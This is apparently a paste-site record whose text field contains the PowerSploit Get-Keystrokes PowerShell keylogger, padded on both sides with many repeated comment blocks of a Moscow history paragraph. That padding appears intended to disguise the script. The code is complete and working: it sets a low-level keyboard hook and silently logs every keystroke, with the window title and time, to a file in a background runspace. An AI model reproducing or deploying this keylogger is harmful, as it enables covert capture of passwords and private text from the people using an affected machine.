{
 "espireDate": "N",
 "format": "text",
 "jSonReasons": [
  "kw_keylogger",
  "re_sql",
  "re_url",
  "lg_en",
  "re_ast1",
  "kw_hack",
  "kw_exploit"
 ],
 "key": "M9H2gYaZ",
 "pasteDate": "Feb 17, 2018, 2:27:14 PM",
 "relevancy": 0.0,
 "relevant": false,
 "text": "<# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #>\n<# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #>\nfunction Get-Keystrokes {\n<#\n.SYNOPSIS\n\n    Logs keys pressed, time and the active window.\n    \n    PowerSploit Function: Get-Keystrokes\n    Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)\n    Revised By: Jesse Davis (@secabstraction)\n    License: BSD 3-Clause\n    Required Dependencies: None\n    Optional Dependencies: None\n    \n.PARAMETER LogPath\n\n    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\\key.log.\n\n.PARAMETER Timeout\n\n    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.\n\n.PARAMETER PassThru\n\n    Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.\n\n.EXAMPLE\n\n    Get-Keystrokes -LogPath C:\\key.log\n\n.EXAMPLE\n\n    Get-Keystrokes -Timeout 20\n    \n.LINK\n\n    http://www.obscuresec.com/\n    http://www.exploit-monday.com/\n    https://github.com/secabstraction\n#>\n    [CmdletBinding()] \n    Param (\n        [Parameter(Position = 0)]\n        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]\n        [String]$LogPath = \"$($env:TEMP)\\key.log\",\n\n        [Parameter(Position = 1)]\n        [Double]$Timeout,\n\n        [Parameter()]\n        [Switch]$PassThru\n    )\n\n    $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)\n\n    try { '\"TypedKey\",\"WindowTitle\",\"Time\"' | Out-File -FilePath $LogPath -Encoding unicode }\n    catch { throw $_ }\n\n    $Script = {\n        Param (\n            [Parameter(Position = 0)]\n            [String]$LogPath,\n\n            [Parameter(Position = 1)]\n            [Double]$Timeout\n        )\n\n        function local:Get-DelegateType {\n            Param (\n                [OutputType([Type])]\n            \n                [Parameter( Position = 0)]\n                [Type[]]\n                $Parameters = (New-Object Type[](0)),\n            \n                [Parameter( Position = 1 )]\n                [Type]\n                $ReturnType = [Void]\n            )\n\n            $Domain = [AppDomain]::CurrentDomain\n            $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')\n            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)\n            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')\n            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)\n            $MethodBuilder.SetImplementationFlags('Runtime, Managed')\n        \n            $TypeBuilder.CreateType()\n        }\n        function local:Get-ProcAddress {\n            Param (\n                [OutputType([IntPtr])]\n        \n                [Parameter( Position = 0, Mandatory = $True )]\n                [String]\n                $Module,\n            \n                [Parameter( Position = 1, Mandatory = $True )]\n                [String]\n                $Procedure\n            )\n\n            # Get a reference to System.dll in the GAC\n            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |\n                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }\n            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')\n            # Get a reference to the GetModuleHandle and GetProcAddress methods\n            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')\n            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')\n            # Get a handle to the module specified\n            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\n            $tmpPtr = New-Object IntPtr\n            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\n        \n            # Return the address of the function\n            $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\n        }\n\n        #region Imports\n\n        [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')\n\n        # SetWindowsHookEx\n        $SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA\n\t    $SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])\n\t    $SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)\n\n        # CallNextHookEx\n        $CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx\n\t    $CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])\n\t    $CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)\n\n        # UnhookWindowsHookEx\n        $UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx\n\t    $UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])\n\t    $UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)\n\n        # PeekMessage\n        $PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA\n\t    $PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])\n\t    $PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)\n\n        # GetAsyncKeyState\n        $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState\n\t    $GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])\n\t    $GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)\n\n        # GetForegroundWindow\n        $GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow\n\t    $GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])\n\t    $GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)\n\n        # GetWindowText\n        $GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA\n\t    $GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])\n\t    $GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)\n\n        # GetModuleHandle\n        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA\n\t    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])\n\t    $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)\n    \n        #endregion Imports\n\n        $CallbackScript = {\n            Param (\n                [Parameter()]\n                [Int32]$Code,\n\n                [Parameter()]\n                [IntPtr]$wParam,\n\n                [Parameter()]\n                [IntPtr]$lParam\n            )\n\n            $Keys = [Windows.Forms.Keys]\n        \n            $MsgType = $wParam.ToInt32()\n\n            # Process WM_KEYDOWN & WM_SYSKEYDOWN messages\n            if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {\n            \n                $hWindow = $GetForegroundWindow.Invoke()\n\n                $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)\n                if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }\n                else { $Shift = $false }\n\n                $Caps = [Console]::CapsLock\n\n                # Read virtual-key from buffer\n                $vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)\n\n                # Parse virtual-key\n                if ($vKey -gt 64 -and $vKey -lt 91) { # Alphabet characters\n                    if ($Shift -xor $Caps) { $Key = $vKey.ToString() }\n                    else { $Key = $vKey.ToString().ToLower() }\n                }\n                elseif ($vKey -ge 96 -and $vKey -le 111) { # Number pad characters\n                    switch ($vKey.value__) {\n                        96 { $Key = '0' }\n                        97 { $Key = '1' }\n                        98 { $Key = '2' }\n                        99 { $Key = '3' }\n                        100 { $Key = '4' }\n                        101 { $Key = '5' }\n                        102 { $Key = '6' }\n                        103 { $Key = '7' }\n                        104 { $Key = '8' }\n                        105 { $Key = '9' }\n                        106 { $Key = \"*\" }\n                        107 { $Key = \"+\" }\n                        108 { $Key = \"|\" }\n                        109 { $Key = \"-\" }\n                        110 { $Key = \".\" }\n                        111 { $Key = \"/\" }\n                    }\n                }\n                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      \n                    if ($Shift) {                           \n                        switch ($vKey.value__) { # Shiftable characters\n                            48 { $Key = ')' }\n                            49 { $Key = '!' }\n                            50 { $Key = '@' }\n                            51 { $Key = '#' }\n                            52 { $Key = '$' }\n                            53 { $Key = '%' }\n                            54 { $Key = '^' }\n                            55 { $Key = '&' }\n                            56 { $Key = '*' }\n                            57 { $Key = '(' }\n                            186 { $Key = ':' }\n                            187 { $Key = '+' }\n                            188 { $Key = '<' }\n                            189 { $Key = '_' }\n                            190 { $Key = '>' }\n                            191 { $Key = '?' }\n                            192 { $Key = '~' }\n                            219 { $Key = '{' }\n                            220 { $Key = '|' }\n                            221 { $Key = '}' }\n                            222 { $Key = '<Double Quotes>' }\n                        }\n                    }\n                    else {                           \n                        switch ($vKey.value__) {\n                            48 { $Key = '0' }\n                            49 { $Key = '1' }\n                            50 { $Key = '2' }\n                            51 { $Key = '3' }\n                            52 { $Key = '4' }\n                            53 { $Key = '5' }\n                            54 { $Key = '6' }\n                            55 { $Key = '7' }\n                            56 { $Key = '8' }\n                            57 { $Key = '9' }\n                            186 { $Key = ';' }\n                            187 { $Key = '=' }\n                            188 { $Key = ',' }\n                            189 { $Key = '-' }\n                            190 { $Key = '.' }\n                            191 { $Key = '/' }\n                            192 { $Key = '`' }\n                            219 { $Key = '[' }\n                            220 { $Key = '\\' }\n                            221 { $Key = ']' }\n                            222 { $Key = '<Single Quote>' }\n                        }\n                    }\n                }\n                else {\n                    switch ($vKey) {\n                        $Keys::F1  { $Key = '<F1>' }\n                        $Keys::F2  { $Key = '<F2>' }\n                        $Keys::F3  { $Key = '<F3>' }\n                        $Keys::F4  { $Key = '<F4>' }\n                        $Keys::F5  { $Key = '<F5>' }\n                        $Keys::F6  { $Key = '<F6>' }\n                        $Keys::F7  { $Key = '<F7>' }\n                        $Keys::F8  { $Key = '<F8>' }\n                        $Keys::F9  { $Key = '<F9>' }\n                        $Keys::F10 { $Key = '<F10>' }\n                        $Keys::F11 { $Key = '<F11>' }\n                        $Keys::F12 { $Key = '<F12>' }\n\t\t\t\n                        $Keys::Snapshot    { $Key = '<Print Screen>' }\n                        $Keys::Scroll      { $Key = '<Scroll Lock>' }\n                        $Keys::Pause       { $Key = '<Pause/Break>' }\n                        $Keys::Insert      { $Key = '<Insert>' }\n                        $Keys::Home        { $Key = '<Home>' }\n                        $Keys::Delete      { $Key = '<Delete>' }\n                        $Keys::End         { $Key = '<End>' }\n                        $Keys::Prior       { $Key = '<Page Up>' }\n                        $Keys::Next        { $Key = '<Page Down>' }\n                        $Keys::Escape      { $Key = '<Esc>' }\n                        $Keys::NumLock     { $Key = '<Num Lock>' }\n                        $Keys::Capital     { $Key = '<Caps Lock>' }\n                        $Keys::Tab         { $Key = '<Tab>' }\n                        $Keys::Back        { $Key = '<Backspace>' }\n                        $Keys::Enter       { $Key = '<Enter>' }\n                        $Keys::Space       { $Key = '< >' }\n                        $Keys::Left        { $Key = '<Left>' }\n                        $Keys::Up          { $Key = '<Up>' }\n                        $Keys::Right       { $Key = '<Right>' }\n                        $Keys::Down        { $Key = '<Down>' }\n                        $Keys::LMenu       { $Key = '<Alt>' }\n                        $Keys::RMenu       { $Key = '<Alt>' }\n                        $Keys::LWin        { $Key = '<Windows Key>' }\n                        $Keys::RWin        { $Key = '<Windows Key>' }\n                        $Keys::LShiftKey   { $Key = '<Shift>' }\n                        $Keys::RShiftKey   { $Key = '<Shift>' }\n                        $Keys::LControlKey { $Key = '<Ctrl>' }\n                        $Keys::RControlKey { $Key = '<Ctrl>' }\n                    }\n                }\n\n                # Get foreground window's title\n                $Title = New-Object Text.Stringbuilder 256\n                $GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)\n\n                # Define object properties\n                $Props = @{\n                    Key = $Key\n                    Time = [DateTime]::Now\n                    Window = $Title.ToString()\n                }\n\n                $obj = New-Object psobject -Property $Props\n            \n                # Stupid hack since Export-CSV doesn't have an append switch in PSv2\n                $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]\n\n                #return results\n                Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode\n            }\n            return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)\n        }\n\n        # Cast scriptblock as LowLevelKeyboardProc callback\n        $Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])\n        $Callback = $CallbackScript -as $Delegate\n    \n        # Get handle to PowerShell for hook\n        $PoshModule = (Get-Process -Id $PID).MainModule.ModuleName\n        $ModuleHandle = $GetModuleHandle.Invoke($PoshModule)\n\n        # Set WM_KEYBOARD_LL hook\n        $Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)\n    \n        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()\n\n        while ($true) {\n            if ($PSBoundParameters.Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }\n            $PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)\n            Start-Sleep -Milliseconds 10\n        }\n\n        $Stopwatch.Stop()\n    \n        # Remove the hook\n        $UnhookWindowsHookEx.Invoke($Hook)\n    }\n\n    # Setup KeyLogger's runspace\n    $PowerShell = [PowerShell]::Create()\n    [void]$PowerShell.AddScript($Script)\n    [void]$PowerShell.AddArgument($LogPath)\n    if ($PSBoundParameters.Timeout) { [void]$PowerShell.AddArgument($Timeout) }\n\n    # Start KeyLogger\n    [void]$PowerShell.BeginInvoke()\n\n    if ($PassThru.IsPresent) { return $PowerShell }\n}\n\n<# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 